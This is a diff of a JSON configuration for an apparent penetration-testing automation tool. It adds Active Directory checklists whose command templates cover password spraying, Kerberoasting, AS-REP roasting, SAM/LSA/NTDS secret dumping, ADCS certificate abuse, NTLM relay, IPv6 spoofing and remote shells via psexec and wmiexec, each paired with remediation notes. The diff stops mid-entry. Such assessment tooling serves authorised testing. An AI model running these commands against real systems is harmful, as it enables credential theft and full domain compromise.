@@ -2608,9 +3394,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2625,9 +3411,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2642,13 +3428,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "critical": [
                 "gMSA"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "creds"
@@ -2663,9 +3449,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 1800,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "bloodhound"
@@ -2680,9 +3466,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2697,9 +3483,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2714,9 +3500,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2731,9 +3517,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2748,9 +3534,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2765,9 +3551,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2782,9 +3568,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2799,9 +3585,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2816,13 +3602,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "info": [
                 "Found CA"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "adcs"
@@ -2837,9 +3623,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "smb",
               "gpp"
@@ -2854,13 +3640,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "critical": [
                 "VULNERABLE"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln"
@@ -2875,13 +3661,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "critical": [
                 "VULNERABLE"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln"
@@ -2896,13 +3682,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "critical": [
                 "AWS"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "creds"
@@ -2917,13 +3703,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "critical": [
                 "AutoLogon"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "gpp",
@@ -2939,13 +3725,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "critical": [
                 "Found"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "gpp",
@@ -2961,13 +3747,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
                 "ESC"
               ]
             },
-            "finding_template": {},
             "tags": [
               "adcs",
               "vuln"
@@ -2982,13 +3768,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "warning": [
                 "Unconstrained"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ad",
               "delegation"
@@ -3003,13 +3789,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "critical": [
                 "\\$krb5tgs\\$"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ad",
               "kerberos"
@@ -3028,13 +3814,13 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "critical": [
                 "\\$krb5asrep\\$"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ad",
               "kerberos"
@@ -3049,9 +3835,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ad",
               "enum"
@@ -3066,9 +3852,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 1800,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ad",
               "bloodhound"
@@ -3083,9 +3869,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ad",
               "enum"
@@ -3100,13 +3886,593 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ad",
               "dns"
             ],
+            "enabled": true
+          }
+        ]
+      },
+      {
+        "name": "AD Credential Access",
+        "description": "BloodHound, roasting, spraying, secrets dumping and ADCS abuse with low-priv creds.",
+        "is_default_import": true,
+        "requires_auth": true,
+        "speed_profile": "default",
+        "items": [
+          {
+            "name": "NXC LDAP BloodHound",
+            "description": "Collect BloodHound data via netexec.",
+            "command_template": "netexec ldap {pdcip} -u {username} -p {password} --bloodhound --collection All --dns-server {pdcip}",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "BloodHound-python Collect",
+            "description": "Full BloodHound collection (zip) for offline analysis.",
+            "command_template": "bloodhound-python -c All -u {username} -p '{password}' -d {domain} -ns {pdcip} --zip",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "NXC SMB Password Policy",
+            "description": "Read domain password/lockout policy BEFORE spraying (avoid lockouts).",
+            "command_template": "netexec smb {pdcip} -u {username} -p {password} --pass-pol",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "warning": [
+                "Account Lockout Threshold: None",
+                "Minimum password length: [0-6]\\b"
+              ]
+            },
+            "finding_template": {
+              "title": "Weak Domain Password Policy",
+              "severity": "medium",
+              "remediation": "Set a lockout threshold and enforce >= 12-char complex passwords.",
+              "cwe": "CWE-521"
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "Kerbrute UserEnum",
+            "description": "Enumerate valid domain users via Kerberos pre-auth (no lockout).",
+            "command_template": "kerbrute userenum -d {domain} --dc {pdcip} {domainusersfile}",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "NXC SMB Password Spray",
+            "description": "Spray ONE password across users. Check --pass-pol first; watch lockout.",
+            "command_template": "netexec smb {targets} -u {domainusersfile} -p {password} --continue-on-success",
+            "output_regex": {
+              "spray_valid_login": "\\[\\+\\]\\s+\\S+\\\\(\\S+):"
+            },
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {
+              "variable_mapping": {
+                "spray_valid_login": "spray_valid_user"
+              }
+            },
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "high": [
+                "\\[\\+\\]"
+              ]
+            },
+            "finding_template": {
+              "title": "Weak/Guessable Password (Spray Hit)",
+              "severity": "high",
+              "remediation": "Enforce strong unique passwords; deploy MFA; monitor spray patterns.",
+              "cwe": "CWE-521"
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "GetNPUsers ASREPRoast",
+            "description": "Unauthenticated AS-REP roasting of accounts without pre-auth.",
+            "command_template": "impacket-GetNPUsers {domain}/ -dc-ip {pdcip} -usersfile {domainusersfile} -format hashcat -no-pass -outputfile {domain}_asrep.txt",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "high": [
+                "\\$krb5asrep\\$"
+              ]
+            },
+            "finding_template": {
+              "title": "AS-REP Roastable Accounts (Kerberos pre-auth disabled)",
+              "severity": "high",
+              "remediation": "Require Kerberos pre-authentication for all accounts; strong passwords.",
+              "cwe": "CWE-262"
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "GetUserSPNs Kerberoast",
+            "description": "Request TGS for SPN accounts and extract roastable hashes.",
+            "command_template": "impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {pdcip} -request -outputfile {domain}_kerb.txt",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "high": [
+                "\\$krb5tgs\\$"
+              ]
+            },
+            "finding_template": {
+              "title": "Kerberoastable Service Accounts (SPNs)",
+              "severity": "high",
+              "remediation": "Use gMSAs or 25+ char passwords; remove stale SPNs; AES-only.",
+              "cwe": "CWE-262"
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "NXC SMB GPP Passwords",
+            "description": "Search SYSVOL for Group Policy Preferences cpassword.",
+            "command_template": "netexec smb {targets} -u {username} -p {password} -M gpp_password",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "high": [
+                "Found",
+                "cpassword",
+                "Password"
+              ]
+            },
+            "finding_template": {
+              "title": "Group Policy Preferences Cached Credentials (cpassword)",
+              "severity": "high",
+              "remediation": "Remove GPP passwords from SYSVOL; apply KB2962486.",
+              "cve": "CVE-2014-1812"
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "NXC SMB GPP Autologin",
+            "description": "Search SYSVOL for autologon credentials.",
+            "command_template": "netexec smb {targets} -u {username} -p {password} -M gpp_autologin",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "high": [
+                "Found",
+                "Password",
+                "AutoLogon"
+              ]
+            },
+            "finding_template": {
+              "title": "Group Policy Autologon Credentials in SYSVOL",
+              "severity": "high",
+              "remediation": "Remove autologon credentials from GPO/registry."
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "NXC SMB Dump SAM",
+            "description": "Dump local SAM hashes (requires local admin).",
+            "command_template": "netexec smb {target} -u {username} -p {password} --sam",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "high": [
+                ":::"
+              ]
+            },
+            "finding_template": {
+              "title": "Local SAM Hashes Extracted (Administrative Access)",
+              "severity": "high",
+              "remediation": "Restrict local admin; enable LAPS; enforce Credential Guard."
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "NXC SMB Dump LSA",
+            "description": "Dump LSA secrets (requires local admin).",
+            "command_template": "netexec smb {target} -u {username} -p {password} --lsa",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "high": [
+                "\\$MACHINE.ACC",
+                "dpapi_",
+                "_SC_"
+              ]
+            },
+            "finding_template": {
+              "title": "LSA Secrets Extracted (Administrative Access)",
+              "severity": "high",
+              "remediation": "Restrict local admin; enable Credential Guard; rotate service creds."
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "NXC SMB DCSync (NTDS)",
+            "description": "Extract NTDS.dit domain hashes via DRSUAPI (DCSync).",
+            "command_template": "netexec smb {pdcip} -u {username} -p {password} --ntds",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "critical": [
+                ":::"
+              ]
+            },
+            "finding_template": {
+              "title": "DCSync / NTDS Extraction — Full Domain Compromise",
+              "severity": "critical",
+              "remediation": "Restrict DS-Replication-Get-Changes rights to DCs; investigate the account used.",
+              "cwe": "CWE-269"
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "Secretsdump DCSync",
+            "description": "impacket secretsdump (SAM/LSA/NTDS depending on target).",
+            "command_template": "impacket-secretsdump {domain}/{username}:{password}@{pdcip}",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "critical": [
+                ":::"
+              ]
+            },
+            "finding_template": {
+              "title": "Domain Credential Material Dumped (secretsdump)",
+              "severity": "critical",
+              "remediation": "Investigate replication rights and privileged access to the target."
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "Certipy Find Vulnerable",
+            "description": "Enumerate vulnerable ADCS templates (ESC1-16).",
+            "command_template": "certipy find -u {username}@{domain} -p '{password}' -dc-ip {pdcip} -vulnerable -stdout",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "high": [
+                "ESC",
+                "Vulnerable"
+              ]
+            },
+            "finding_template": {
+              "title": "ADCS Vulnerable Certificate Template (ESCx)",
+              "severity": "high",
+              "remediation": "Remediate the flagged ESC misconfiguration (enrollment rights, EKU, SAN, approval)."
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "Certipy Request Cert (ESC1)",
+            "description": "Request a certificate as another principal (ESC1 abuse).",
+            "command_template": "certipy req -u {username}@{domain} -p '{password}' -dc-ip {pdcip} -ca {ca_name} -template {template_name} -upn administrator@{domain}",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          }
+        ]
+      },
+      {
+        "name": "AD Coercion & Relay",
+        "description": "Network-position attacks: LLMNR/NBT-NS poisoning, NTLM relay, IPv6 takeover, coercion.",
+        "is_default_import": true,
+        "requires_auth": false,
+        "speed_profile": "default",
+        "items": [
+          {
+            "name": "Responder Analyze (passive)",
+            "description": "PASSIVE analyze mode — observe LLMNR/NBT-NS/mDNS without poisoning.",
+            "command_template": "responder -I {interface} -A",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 120,
+            "alert_patterns": {
+              "warning": [
+                "\\[.*\\] Request",
+                "Poisoned",
+                "Analyze"
+              ]
+            },
+            "finding_template": {
+              "title": "LLMNR/NBT-NS/mDNS Name Resolution Poisoning Possible",
+              "severity": "medium",
+              "remediation": "Disable LLMNR, NBT-NS and mDNS via GPO/DHCP; enforce SMB signing.",
+              "cwe": "CWE-300"
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "ntlmrelayx to SMB",
+            "description": "Relay coerced NTLM auth to SMB targets lacking signing (from relay list).",
+            "command_template": "impacket-ntlmrelayx -tf relayables.txt -smb2support -i",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "ntlmrelayx to ADCS (ESC8)",
+            "description": "Relay machine auth to ADCS web enrollment (ESC8) to mint a DC certificate.",
+            "command_template": "impacket-ntlmrelayx -t http://{pdcip}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "mitm6 IPv6 Takeover",
+            "description": "Spoof IPv6 DNS (WPAD) to coerce auth — pair with ntlmrelayx.",
+            "command_template": "mitm6 -d {domain}",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 300,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "Coercer Trigger",
+            "description": "Trigger authentication coercion from a target to your listener.",
+            "command_template": "coercer coerce -u {username} -p '{password}' -d {domain} -t {target} -l {listener}",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          }
+        ]
+      },
+      {
+        "name": "AD Lateral Movement & Execution",
+        "description": "Command execution and lateral movement with obtained credentials.",
+        "is_default_import": true,
+        "requires_auth": true,
+        "speed_profile": "default",
+        "items": [
+          {
+            "name": "NXC SMB Command Exec",
+            "description": "Execute a command where creds grant admin (Pwn3d!).",
+            "command_template": "netexec smb {targets} -u {username} -p {password} -x \"whoami /all\"",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
+            "finding_template": {
+              "title": "Remote Command Execution via SMB (Administrative Access)",
+              "severity": "high",
+              "remediation": "Reduce local-admin sprawl; enforce tiering, LAPS and Credential Guard."
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "wmiexec Shell",
+            "description": "Semi-interactive shell via WMI.",
+            "command_template": "impacket-wmiexec {domain}/{username}:{password}@{target}",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "psexec Shell",
+            "description": "SYSTEM shell via service creation (noisy).",
+            "command_template": "impacket-psexec {domain}/{username}:{password}@{target}",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "atexec Command",
+            "description": "Command execution via the Task Scheduler.",
+            "command_template": "impacket-atexec {domain}/{username}:{password}@{target} \"whoami\"",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "NXC MSSQL xp_cmdshell",
+            "description": "Execute OS command via MSSQL xp_cmdshell.",
+            "command_template": "netexec mssql {target} -u {username} -p {password} -x \"whoami\"",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {
+              "high": [
+                "nt authority",
+                "nt service",
+                "xp_cmdshell"
+              ]
+            },
+            "finding_template": {
+              "title": "MSSQL xp_cmdshell OS Command Execution",
+              "severity": "high",
+              "remediation": "Disable xp_cmdshell; least-privilege the SQL service account."
+            },
+            "tags": [],
+            "enabled": true
+          },
+          {
+            "name": "mssqlclient Interactive",
+            "description": "Interactive MSSQL client (enable_xp_cmdshell, linked servers).",
+            "command_template": "impacket-mssqlclient {domain}/{username}:{password}@{target} -windows-auth",
+            "output_regex": {},
+            "variables": {},
+            "input_definitions": {},
+            "storage_policy": {},
+            "parameter_schema": {},
+            "target_filter": {},
+            "timeout": 1800,
+            "alert_patterns": {},
+            "finding_template": {},
+            "tags": [],
             "enabled": true
           }
         ]
@@ -3292,13 +4658,33 @@
             {
               "source": 0,
               "target": 1
+            },
+            {
+              "source": 1,
+              "target": 2
+            },
+            {
+              "source": 2,
+              "target": 3
             }
           ]
         },
         "steps": [
           {
-            "checklist_item_name": "Nmap Top 10000 Port Scan",
+            "checklist_item_name": "Nmap Full Port Scan",
             "order_index": 0,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 0
+            }
+          },
+          {
+            "checklist_item_name": "Nmap Top 10000 Port Scan",
+            "order_index": 1,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
@@ -3309,15 +4695,27 @@
             }
           },
           {
-            "checklist_item_name": "Nmap Service Discovery",
-            "order_index": 1,
+            "checklist_item_name": "Rustscan Full Port Scan",
+            "order_index": 2,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 248.0371077762619,
-              "y": 281.4843110504775
+              "x": 250,
+              "y": 240
+            }
+          },
+          {
+            "checklist_item_name": "Nmap Service Discovery",
+            "order_index": 3,
+            "input_mapping": {},
+            "condition": null,
+            "on_failure": "continue",
+            "timeout_override": null,
+            "ui_position": {
+              "x": 250,
+              "y": 360
             }
           }
         ]
@@ -3333,30 +4731,6 @@
         ],
         "flow_definition": {
           "edges": [
-            {
-              "source": 7,
-              "target": 8
-            },
-            {
-              "source": 8,
-              "target": 9
-            },
-            {
-              "source": 9,
-              "target": 10
-            },
-            {
-              "source": 10,
-              "target": 11
-            },
-            {
-              "source": 11,
-              "target": 12
-            },
-            {
-              "source": 12,
-              "target": 13
-            },
             {
               "source": 0,
               "target": 1
@@ -3384,6 +4758,86 @@
             {
               "source": 6,
               "target": 7
+            },
+            {
+              "source": 7,
+              "target": 8
+            },
+            {
+              "source": 8,
+              "target": 9
+            },
+            {
+              "source": 9,
+              "target": 10
+            },
+            {
+              "source": 10,
+              "target": 11
+            },
+            {
+              "source": 11,
+              "target": 12
+            },
+            {
+              "source": 12,
+              "target": 13
+            },
+            {
+              "source": 13,
+              "target": 14
+            },
+            {
+              "source": 14,
+              "target": 15
+            },
+            {
+              "source": 15,
+              "target": 16
+            },
+            {
+              "source": 16,
+              "target": 17
+            },
+            {
+              "source": 17,
+              "target": 18
+            },
+            {
+              "source": 18,
+              "target": 19
+            },
+            {
+              "source": 19,
+              "target": 20
+            },
+            {
+              "source": 20,
+              "target": 21
+            },
+            {
+              "source": 21,
+              "target": 22
+            },
+            {
+              "source": 22,
+              "target": 23
+            },
+            {
+              "source": 23,
+              "target": 24
+            },
+            {
+              "source": 24,
+              "target": 25
+            },
+            {
+              "source": 25,
+              "target": 26
+            },
+            {
+              "source": 26,
+              "target": 27
             }
           ]
         },
@@ -3401,19 +4855,19 @@
             }
           },
           {
-            "checklist_item_name": "NXC SMB Null Auth (batch)",
+            "checklist_item_name": "NXC SMB Guest Auth",
             "order_index": 1,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 252,
-              "y": 126
+              "x": 250,
+              "y": 120
             }
           },
           {
-            "checklist_item_name": "NXC RDP Guest Auth (batch)",
+            "checklist_item_name": "NXC SMB Null Auth (batch)",
             "order_index": 2,
             "input_mapping": {},
             "condition": null,
@@ -3421,139 +4875,307 @@
             "timeout_override": null,
             "ui_position": {
               "x": 250,
-              "y": 258
+              "y": 240
             }
           },
           {
-            "checklist_item_name": "NXC RDP Null Auth (batch)",
+            "checklist_item_name": "NXC SMB Null Auth",
             "order_index": 3,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 256,
-              "y": 392.0000000000001
+              "x": 250,
+              "y": 360
             }
           },
           {
-            "checklist_item_name": "NXC WinRM Guest Auth (batch)",
+            "checklist_item_name": "NXC RDP Guest Auth (batch)",
             "order_index": 4,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 262.6006143594028,
-              "y": 520.676828560092
+              "x": 250,
+              "y": 480
             }
           },
           {
-            "checklist_item_name": "NXC WinRM Null Auth (batch)",
+            "checklist_item_name": "NXC RDP Guest Auth",
             "order_index": 5,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 254,
-              "y": 650.0000000000001
+              "x": 250,
+              "y": 600
             }
           },
           {
-            "checklist_item_name": "NXC MSSQL Guest Auth (batch)",
+            "checklist_item_name": "NXC RDP Null Auth (batch)",
             "order_index": 6,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 254.6081678579459,
-              "y": 795.9668408205722
+              "x": 250,
+              "y": 720
             }
           },
           {
-            "checklist_item_name": "NXC MSSQL Null Auth (batch)",
+            "checklist_item_name": "NXC RDP Null Auth",
             "order_index": 7,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 255.58086516319395,
-              "y": 953.8926940324268
+              "x": 250,
+              "y": 840
             }
           },
           {
-            "checklist_item_name": "NXC SSH Guest Auth (batch)",
+            "checklist_item_name": "NXC WinRM Guest Auth (batch)",
             "order_index": 8,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 266.358793899951,
-              "y": 1147.1574452974012
+              "x": 250,
+              "y": 960
             }
           },
           {
-            "checklist_item_name": "NXC SSH Null Auth (batch)",
+            "checklist_item_name": "NXC WinRM Guest Auth",
             "order_index": 9,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 266.1756132205919,
-              "y": 1319.5787226487007
+              "x": 250,
+              "y": 1080
             }
           },
           {
-            "checklist_item_name": "NXC FTP Guest Auth (batch)",
+            "checklist_item_name": "NXC WinRM Null Auth (batch)",
             "order_index": 10,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 274.42802036404623,
-              "y": 1478.183704835888
+              "x": 250,
+              "y": 1200
             }
           },
           {
-            "checklist_item_name": "NXC FTP Null Auth (batch)",
+            "checklist_item_name": "NXC WinRM Null Auth",
             "order_index": 11,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 271.42097738339635,
-              "y": 1633.445114931903
+              "x": 250,
+              "y": 1320
             }
           },
           {
-            "checklist_item_name": "NXC WMI Guest Auth (batch)",
+            "checklist_item_name": "NXC MSSQL Guest Auth (batch)",
             "order_index": 12,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 269.03017193563346,
-              "y": 1784.554885068097
+              "x": 250,
+              "y": 1440
             }
           },
           {
-            "checklist_item_name": "NXC WMI Null Auth (batch)",
+            "checklist_item_name": "NXC MSSQL Guest Auth",
             "order_index": 13,
             "input_mapping": {},
             "condition": null,
             "on_failure": "continue",
             "timeout_override": null,
             "ui_position": {
-              "x": 272,
-              "y": 1923.092480844683
+              "x": 250,
